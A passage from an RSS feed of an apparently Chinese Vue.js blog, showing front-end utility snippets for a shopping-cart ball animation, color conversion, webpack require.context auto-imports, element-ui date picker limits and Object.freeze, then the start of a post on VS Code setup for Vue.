        <span>if</span> <span>(</span><span>typeof</span> opt <span>===</span> <span>"object"</span><span>)</span> <span>{</span>
          fly <span>=</span> <span>{</span>
            <span>...</span>fly<span>,</span>
            <span>...</span>opt<span>,</span>
          <span>}</span><span>;</span>
        <span>}</span>

        <span>if</span> <span>(</span><span>!</span>fly<span>.</span>begin <span>||</span> <span>!</span>fly<span>.</span>end<span>)</span> <span>return</span> vData<span>;</span>

        <span>/**
         * beginCrood 获取开始元素的位置
         * endCrood   获取结束元素的位置
         */</span>
        <span>let</span> beginCrood <span>=</span> fly<span>.</span>begin<span>.</span><span>getBoundingClientRect</span><span>(</span><span>)</span><span>;</span>
        <span>let</span> endCrood <span>=</span> fly<span>.</span>end<span>.</span><span>getBoundingClientRect</span><span>(</span><span>)</span><span>;</span>

        <span>/*!
         *  购物车动画出现的位置
         *  left: 开始元素的left+width/2
         *  top: 开始元素的top
         *  购物车动画结束的位置
         *  x: 结束元素的left+width/2 再减去购物车动画出现的位置的left
         *  y: 结束元素的top+height/2 再减去购物车动画出现的位置的top
         */</span>
        <span>/**
         * 全部减去 18是因为购物车宽度和高度都是35px;一半难得算(-_-),就填18
         */</span>
        vData<span>.</span>site<span>.</span>left <span>=</span>
          beginCrood<span>.</span>left <span>+</span> <span>parseInt</span><span>(</span>beginCrood<span>.</span>width <span>/</span> <span>2</span><span>,</span> <span>10</span><span>)</span> <span>-</span> <span>18</span><span>;</span>
        vData<span>.</span>site<span>.</span>top <span>=</span> beginCrood<span>.</span>top <span>-</span> <span>18</span><span>;</span>
        vData<span>.</span>coord<span>.</span>x <span>=</span>
          endCrood<span>.</span>left <span>+</span>
          <span>parseInt</span><span>(</span>endCrood<span>.</span>width <span>/</span> <span>2</span><span>,</span> <span>10</span><span>)</span> <span>-</span>
          vData<span>.</span>site<span>.</span>left <span>-</span>
          <span>18</span><span>;</span>
        vData<span>.</span>coord<span>.</span>y <span>=</span>
          endCrood<span>.</span>top <span>+</span>
          <span>parseInt</span><span>(</span>endCrood<span>.</span>height <span>/</span> <span>2</span><span>,</span> <span>10</span><span>)</span> <span>-</span>
          vData<span>.</span>site<span>.</span>top <span>-</span>
          <span>18</span><span>;</span>
        vData<span>.</span>coord<span>.</span>os <span>=</span> <span>-</span><span>50</span><span>;</span>
        vData<span>.</span>callback <span>=</span> fly<span>.</span>callback<span>;</span>
        <span>if</span> <span>(</span>beginCrood<span>.</span>top <span>></span> endCrood<span>.</span>top<span>)</span> vData<span>.</span>site<span>.</span>cubic <span>=</span> <span>true</span><span>;</span>

        <span>return</span> vData<span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>

    <span>return</span> <span>new</span> <span>Parabola</span><span>(</span>opt<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>(</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>export</span> <span>default</span> ballFly<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>使用栗子:</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>button</span> <span>class</span><span><span>=</span><span>"</span>plus-btn<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>handlerPlus<span>"</span></span><span>></span></span>+<span><span><span>&lt;/</span>button</span><span>></span></span>

    <span><span><span>&lt;</span>br</span> <span>/></span></span>
    <span><span><span>&lt;</span>br</span> <span>/></span></span>
    <span><span><span>&lt;</span>br</span> <span>/></span></span>
    <span><span><span>&lt;</span>br</span> <span>/></span></span>
    <span><span><span>&lt;</span>br</span> <span>/></span></span>

    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>shopping-cart<span>"</span></span><span>></span></span>购物车<span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> ballFly <span>from</span> <span>"@/utils/ballFly"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>handlerPlus</span><span>(</span><span>el</span><span>)</span> <span>{</span>
      <span>ballFly</span><span>(</span><span>{</span>
        <span>begin</span><span>:</span> el<span>.</span><span>querySelector</span><span>(</span><span>".van-stepper__plus"</span><span>)</span><span>,</span> <span>// 起始位置</span>
        <span>end</span><span>:</span> document<span>.</span><span>querySelector</span><span>(</span><span>".picking-num-info"</span><span>)</span><span>,</span> <span>// 终止位置</span>
        <span>size</span><span>:</span> <span>12</span><span>,</span> <span>// 小球的直径,默认 12</span>
        <span>color</span><span>:</span> <span>"#f9666b"</span><span>,</span> <span>//小球的颜色,默认 #f9666b</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="颜色转换" tabindex="-1"> 颜色转换</h2>
<div><pre><code><span>import</span> <span>{</span> isArray<span>,</span> isString <span>}</span> <span>from</span> <span>"lodash"</span><span>;</span>

<span>/**
 * <span>@method</span> color2Hex RGB 颜色转成 16 进制颜色
 * <span>@param</span>  <span><span>{</span>String<span>}</span></span> <span>color</span> RGB 颜色
 * <span>@return</span> <span><span>{</span>Numbe<span>}</span></span> 16 进制颜色
 */</span>
<span>export</span> <span>function</span> <span>color2Hex</span><span>(</span><span>color</span><span>)</span> <span>{</span>
  <span>const</span> reg <span>=</span> <span><span>/</span><span>^#([0-9a-fA-f]{3}|[0-9a-fA-f]{6})$</span><span>/</span></span><span>;</span>
  <span>if</span> <span>(</span><span><span>/</span><span>^(rgb|RGB)</span><span>/</span></span><span>.</span><span>test</span><span>(</span>color<span>)</span><span>)</span> <span>{</span>
    <span>let</span> aColor <span>=</span> color<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?:\(|\)|rgb|RGB)*</span><span>/</span><span>g</span></span><span>,</span> <span>""</span><span>)</span><span>.</span><span>split</span><span>(</span><span>","</span><span>)</span><span>;</span>
    <span>let</span> strHex <span>=</span> <span>"#"</span><span>;</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> aColor<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>let</span> hex <span>=</span> <span>Number</span><span>(</span>aColor<span>[</span>i<span>]</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span><span>;</span>
      <span>if</span> <span>(</span>hex <span>===</span> <span>"0"</span><span>)</span> <span>{</span>
        hex <span>+=</span> hex<span>;</span>
      <span>}</span>
      strHex <span>+=</span> hex<span>;</span>
    <span>}</span>
    <span>if</span> <span>(</span>strHex<span>.</span>length <span>!==</span> <span>7</span><span>)</span> <span>{</span>
      strHex <span>=</span> color<span>;</span>
    <span>}</span>
    <span>return</span> strHex<span>;</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>reg<span>.</span><span>test</span><span>(</span>color<span>)</span><span>)</span> <span>{</span>
    <span>let</span> aNum <span>=</span> color<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>#</span><span>/</span></span><span>,</span> <span>""</span><span>)</span><span>.</span><span>split</span><span>(</span><span>""</span><span>)</span><span>;</span>
    <span>if</span> <span>(</span>aNum<span>.</span>length <span>===</span> <span>6</span><span>)</span> <span>{</span>
      <span>return</span> color<span>;</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>aNum<span>.</span>length <span>===</span> <span>3</span><span>)</span> <span>{</span>
      <span>let</span> numHex <span>=</span> <span>"#"</span><span>;</span>
      <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> aNum<span>.</span>length<span>;</span> i <span>+=</span> <span>1</span><span>)</span> <span>{</span>
        numHex <span>+=</span> aNum<span>[</span>i<span>]</span> <span>+</span> aNum<span>[</span>i<span>]</span><span>;</span>
      <span>}</span>
      <span>return</span> numHex<span>;</span>
    <span>}</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> color<span>;</span>
  <span>}</span>
<span>}</span>

<span>/**
 * <span>@method</span> color2Rgb 16 进制颜色转化成 RGB 颜色
 * <span>@param</span>  <span><span>{</span>Number<span>}</span></span> <span>color</span> 16 进制颜色
 * <span>@return</span> <span><span>{</span>String<span>}</span></span> RGB 颜色
 */</span>
<span>export</span> <span>function</span> <span>color2Rgb</span><span>(</span><span>color</span><span>)</span> <span>{</span>
  <span>const</span> reg <span>=</span> <span><span>/</span><span>^#([0-9a-fA-f]{3}|[0-9a-fA-f]{6})$</span><span>/</span></span><span>;</span>
  <span>let</span> sColor <span>=</span> color<span>.</span><span>toLowerCase</span><span>(</span><span>)</span><span>;</span>
  <span>if</span> <span>(</span>sColor <span>&amp;&amp;</span> reg<span>.</span><span>test</span><span>(</span>sColor<span>)</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>sColor<span>.</span>length <span>===</span> <span>4</span><span>)</span> <span>{</span>
      <span>let</span> sColorNew <span>=</span> <span>"#"</span><span>;</span>
      <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> <span>4</span><span>;</span> i <span>+=</span> <span>1</span><span>)</span> <span>{</span>
        sColorNew <span>+=</span> sColor<span>.</span><span>slice</span><span>(</span>i<span>,</span> i <span>+</span> <span>1</span><span>)</span><span>.</span><span>concat</span><span>(</span>sColor<span>.</span><span>slice</span><span>(</span>i<span>,</span> i <span>+</span> <span>1</span><span>)</span><span>)</span><span>;</span>
      <span>}</span>
      sColor <span>=</span> sColorNew<span>;</span>
    <span>}</span>
    <span>// 处理六位的颜色值</span>
    <span>let</span> sColorChange <span>=</span> <span>[</span><span>]</span><span>;</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> <span>7</span><span>;</span> i <span>+=</span> <span>2</span><span>)</span> <span>{</span>
      sColorChange<span>.</span><span>push</span><span>(</span><span>parseInt</span><span>(</span><span>"0x"</span> <span>+</span> sColor<span>.</span><span>slice</span><span>(</span>i<span>,</span> i <span>+</span> <span>2</span><span>)</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> <span>"rgb("</span> <span>+</span> sColorChange<span>.</span><span>join</span><span>(</span><span>","</span><span>)</span> <span>+</span> <span>")"</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> sColor<span>;</span>
  <span>}</span>
<span>}</span>

<span>/**
 * <span>@method</span> setColor 返回与 color 相近的颜色
 * <span>@param</span> <span><span>{</span>String<span>}</span></span> <span>color</span> RGB 颜色
 * <span>@param</span> <span><span>{</span>Number<span>}</span></span> <span>hex</span> 调整幅度,为 1～hex 的随机数
 * <span>@return</span> <span><span>{</span>String <span>|</span> Array<span>}</span></span> RGB 颜色
 */</span>
<span>export</span> <span>function</span> <span>setColor</span><span>(</span><span>color<span>,</span> hex <span>=</span> <span>50</span></span><span>)</span> <span>{</span>
  <span>const</span> <span>getHex</span> <span>=</span> <span>(</span><span>_color</span><span>)</span> <span>=></span> <span>{</span>
    <span>return</span> _color
      <span>.</span><span>match</span><span>(</span><span><span>/</span><span>\(([^)]*)\)</span><span>/</span></span><span>)</span><span>[</span><span>1</span><span>]</span>
      <span>.</span><span>split</span><span>(</span><span>","</span><span>)</span>
      <span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>Number</span><span>(</span>item<span>)</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
  <span>const</span> <span>setHex</span> <span>=</span> <span>(</span><span>_color</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> sColorChange <span>=</span> _color<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>item <span>===</span> <span>255</span><span>)</span> <span>{</span>
        <span>return</span> item <span>-</span> Math<span>.</span><span>floor</span><span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> hex<span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>const</span> _item <span>=</span> item <span>+</span> Math<span>.</span><span>floor</span><span>(</span>Math<span>.</span><span>random</span><span>(</span><span>)</span> <span>*</span> hex<span>)</span><span>;</span>
        <span>if</span> <span>(</span>_item <span>>=</span> <span>255</span><span>)</span> <span>{</span>
          <span>return</span> <span>255</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
          <span>return</span> _item<span>;</span>
        <span>}</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>

    <span>return</span> <span>"rgb("</span> <span>+</span> sColorChange<span>.</span><span>join</span><span>(</span><span>","</span><span>)</span> <span>+</span> <span>")"</span><span>;</span>
  <span>}</span><span>;</span>

  <span>if</span> <span>(</span><span>isString</span><span>(</span>color<span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>setHex</span><span>(</span><span>getHex</span><span>(</span>color<span>)</span><span>)</span><span>;</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>isArray</span><span>(</span>color<span>)</span><span>)</span> <span>{</span>
    <span>const</span> newColor <span>=</span> color<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>{</span>
      <span>return</span> <span>setHex</span><span>(</span><span>getHex</span><span>(</span>item<span>)</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
    <span>return</span> Array<span>.</span><span>from</span><span>(</span><span>new</span> <span>Set</span><span>(</span>newColor<span>)</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="导出当前目录的所有-component" tabindex="-1"> 导出当前目录的所有 component</h2>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>

<span>const</span> files <span>=</span> require<span>.</span><span>context</span><span>(</span><span>"."</span><span>,</span> <span>false</span><span>,</span> <span><span>/</span><span>\.vue$</span><span>/</span></span><span>)</span><span>;</span>
files<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
  Vue<span>.</span><span>component</span><span>(</span><span>files</span><span>(</span>key<span>)</span><span>.</span>default<span>.</span>name<span>,</span> <span>files</span><span>(</span>key<span>)</span><span>.</span>default<span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="导出当前目录的所有-mock" tabindex="-1"> 导出当前目录的所有 mock</h2>
<div><pre><code><span>const</span> files <span>=</span> require<span>.</span><span>context</span><span>(</span><span>"."</span><span>,</span> <span>false</span><span>,</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>)</span><span>;</span>

files<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>key <span>!==</span> <span>"./mock.js"</span><span>)</span> <span>{</span>
    <span>// 排除自己 mock.js</span>
    <span>files</span><span>(</span>key<span>)</span><span>;</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="导出当前目录的所有-modules" tabindex="-1"> 导出当前目录的所有 modules</h2>
<div><pre><code><span>const</span> files <span>=</span> require<span>.</span><span>context</span><span>(</span><span>"."</span><span>,</span> <span>false</span><span>,</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>)</span><span>;</span>
<span>const</span> modules <span>=</span> <span>{</span><span>}</span><span>;</span>

files<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>key <span>===</span> <span>"./index.js"</span><span>)</span> <span>return</span><span>;</span>
  modules<span>[</span>key<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(\.\/|\.js)</span><span>/</span><span>g</span></span><span>,</span> <span>""</span><span>)</span><span>]</span> <span>=</span> <span>files</span><span>(</span>key<span>)</span><span>.</span>default<span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> modules<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="关于时间的限制" tabindex="-1"> 关于时间的限制</h2>
<div><p>提示</p>
<p>这边提供 element-ui 文档中未提及的日期选择器的自定义禁用时间</p>
</div>
<h3 id="选择今天以及今天之后的日期" tabindex="-1"> 选择今天以及今天之后的日期</h3>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>pickerOptions</span><span>:</span> <span>{</span>
        <span>disabledDate</span><span>(</span><span>time</span><span>)</span> <span>{</span>
          <span>return</span> time<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>&lt;</span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> <span>8.64e7</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="设置选择今天以及今天以前的日期" tabindex="-1"> 设置选择今天以及今天以前的日期</h3>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>pickerOptions</span><span>:</span> <span>{</span>
        <span>disabledDate</span><span>(</span><span>time</span><span>)</span> <span>{</span>
          <span>return</span> time<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>></span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> <span>8.64e6</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="设置选择今天之后的日期-不能选择当天时间" tabindex="-1"> 设置选择今天之后的日期（不能选择当天时间）</h3>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>pickerOptions</span><span>:</span> <span>{</span>
        <span>disabledDate</span><span>(</span><span>time</span><span>)</span> <span>{</span>
          <span>return</span> time<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>&lt;</span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="设置选择今天之前的日期-不能选择当天" tabindex="-1"> 设置选择今天之前的日期（不能选择当天）</h3>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>pickerOptions</span><span>:</span> <span>{</span>
        <span>disabledDate</span><span>(</span><span>time</span><span>)</span> <span>{</span>
          <span>return</span> time<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>></span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="设置选择三个月之前到今天的日期" tabindex="-1"> 设置选择三个月之前到今天的日期</h3>
<div><pre><code><span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>pickerOptions</span><span>:</span> <span>{</span>
        <span>disabledDate</span><span>(</span><span>time</span><span>)</span> <span>{</span>
          <span>let</span> curDate <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getTime</span><span>(</span><span>)</span><span>;</span>
          <span>let</span> three <span>=</span> <span>90</span> <span>*</span> <span>24</span> <span>*</span> <span>3600</span> <span>*</span> <span>1000</span><span>;</span>
          <span>let</span> threeMonths <span>=</span> curDate <span>-</span> three<span>;</span>
          <span>return</span> time<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>></span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>||</span> time<span>.</span><span>getTime</span><span>(</span><span>)</span> <span>&lt;</span> threeMonths<span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="require-context" tabindex="-1"> require.context()</h2>
<ol>
<li>场景:如页面需要导入多个组件,原始写法:</li>
</ol>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> titleCom <span>from</span> <span>"@/components/home/titleCom"</span><span>;</span>
<span>import</span> bannerCom <span>from</span> <span>"@/components/home/bannerCom"</span><span>;</span>
<span>import</span> cellCom <span>from</span> <span>"@/components/home/cellCom"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>components</span><span>:</span> <span>{</span>
    titleCom<span>,</span>
    bannerCom<span>,</span>
    cellCom<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ol start="2">
<li>这样就写了大量重复的代码,利用 require.context 可以写成</li>
</ol>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> files <span>=</span> require<span>.</span><span>context</span><span>(</span><span>"@/components/home"</span><span>,</span> <span>false</span><span>,</span> <span><span>/</span><span>\.vue$</span><span>/</span></span><span>)</span><span>;</span>
<span>const</span> modules <span>=</span> <span>{</span><span>}</span><span>;</span>
files<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> name <span>=</span> path<span>.</span><span>basename</span><span>(</span>key<span>,</span> <span>".vue"</span><span>)</span><span>;</span>
  modules<span>[</span>name<span>]</span> <span>=</span> <span>files</span><span>(</span>key<span>)</span><span>.</span>default <span>||</span> <span>files</span><span>(</span>key<span>)</span><span>;</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>components</span><span>:</span> modules<span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>这样不管页面引入多少组件,都可以使用这个方法</p>
<ol start="3">
<li>API 方法</li>
</ol>
<div><pre><code><span>// 实际上是 webpack 的方法,vue 工程一般基于 webpack,所以可以使用</span>
require<span>.</span><span>context</span><span>(</span>directory<span>,</span> useSubdirectories<span>,</span> regExp<span>)</span><span>;</span>
<span>// 接收三个参数:</span>
<span>// directory：说明需要检索的目录</span>
<span>// useSubdirectories：是否检索子目录</span>
<span>// regExp: 匹配文件的正则表达式,一般是文件名</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="object-freeze" tabindex="-1"> Object.freeze</h2>
<div><p>场景</p>
<p>一个长列表数据,一般不会更改,但是 vue 会做 getter 和 setter 的转换</p>
<p>用法: 是 ES5 新增的特性, 可以冻结一个对象, 防止对象被修改</p>
<p>支持: vue 1.0.18+对其提供了支持, 对于 data 或 vuex 里使用 freeze 冻结了的对象, vue 不会做 getter 和 setter 的转换</p>
<p>注意: 冻结只是冻结里面的单个属性,引用地址还是可以更改</p>
</div>
<div><pre><code><span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>data</span><span>:</span> <span>{</span>
    <span>// vue不会对list里的object做getter、setter绑定</span>
    <span>list</span><span>:</span> Object<span>.</span><span>freeze</span><span>(</span><span>[</span><span>{</span> <span>value</span><span>:</span> <span>1</span> <span>}</span><span>,</span> <span>{</span> <span>value</span><span>:</span> <span>2</span> <span>}</span><span>]</span><span>)</span><span>,</span>
  <span>}</span><span>,</span>
  <span>mounted</span><span>(</span><span>)</span> <span>{</span>
    <span>// 界面不会有响应,因为单个属性被冻结</span>
    <span>this</span><span>.</span>list<span>[</span><span>0</span><span>]</span><span>.</span>value <span>=</span> <span>100</span><span>;</span>

    <span>// 下面两种做法, 界面都会响应</span>
    <span>this</span><span>.</span>list <span>=</span> <span>[</span><span>{</span> <span>value</span><span>:</span> <span>100</span> <span>}</span><span>,</span> <span>{</span> <span>value</span><span>:</span> <span>200</span> <span>}</span><span>]</span><span>;</span>
    <span>this</span><span>.</span>list <span>=</span> Object<span>.</span><span>freeze</span><span>(</span><span>[</span><span>{</span> <span>value</span><span>:</span> <span>100</span> <span>}</span><span>,</span> <span>{</span> <span>value</span><span>:</span> <span>200</span> <span>}</span><span>]</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>vscode 配置之 vue.js 篇</title>
      <link>https://vxhly.github.io/views/vuejs/vscode-config-vuejs.html</link>
      <guid>https://vxhly.github.io/views/vuejs/vscode-config-vuejs.html</guid>
      <source url="https://vxhly.github.io/rss.xml">vscode 配置之 vue.js 篇</source>
      <description>前言
学习 vue.js 的小伙伴前期一定很苦恼吧, 接下这篇文章带你从配置编辑器入手, 提升你的代码开发效率, 保证代码的整洁度, 让你感受到写代码也能飞起来。主要是推荐几款我本人用起来比较方便的 vscode 插件, 以及这些插件的简单配置。

</description>
